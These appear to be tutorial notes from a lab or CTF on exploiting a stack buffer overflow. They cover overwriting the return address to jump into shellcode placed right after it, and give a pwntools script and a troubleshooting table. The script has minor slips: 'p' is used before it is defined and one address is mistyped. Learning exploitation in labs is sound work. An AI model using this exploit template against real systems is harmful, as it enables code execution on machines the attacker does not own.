

Overflow + shellcoding combined: overwrite the return address so it points to shellcode you placed right after it in the same payload.

---

### <span style="color:rgb(146, 208, 80)">The payload formula</span>

```
payload = junk(offset) + address(target+8) + shellcode
```

- **junk** — `b"A" * offset` — filler to reach the return address (find `offset` with `cyclic`/`cyclic_find`, same as buffer overflow)
- **address + 8** — the return address you overwrite with. It's the current stack address (`rsp` at the crash) **+8**, because `+8` skips past the return address slot itself and lands exactly where your shellcode starts (right after it in the payload)
- **shellcode** — your raw shellcode bytes, placed directly in the payload, immediately after the address

So when the function returns, RIP jumps to `address+8` → lands on the first byte of shellcode → runs it.

---

### <span style="color:rgb(146, 208, 80)">In practice</span>

```python
import pwn

# 1) find offset
p.write(pwn.cyclic(2000, n=8) + b"\n")          # crash it
offset = pwn.cyclic_find(0x6661616161616165, n=8)  # RIP value from gdb

# 2) debug with ASLR off to get a stable address
p = pwn.gdb.debug("./hello", aslr=False)
target = 0x7ffffffd548 + 8                       # rsp from gdb, +8 = where shellcode will sit

# 3) build it
payload  = b"A" * offset
payload += pwn.p64(target)
payload += shellcode                             # your raw shellcode bytes

p.write(payload + b"\n")
p.interactive()
```

---

## <span style="color:rgb(146, 208, 80)">Things that go wrong:</span>

|PROBLEM|FIX|
|---|---|
|Segfault at the jump|`target` should be `rsp + 8`, not just `rsp`|
|Wrong offset|Use the same `n=` in both `cyclic()` and `cyclic_find()`|
|Works locally, not remote|ASLR is probably on remote — this exact address trick needs ASLR off|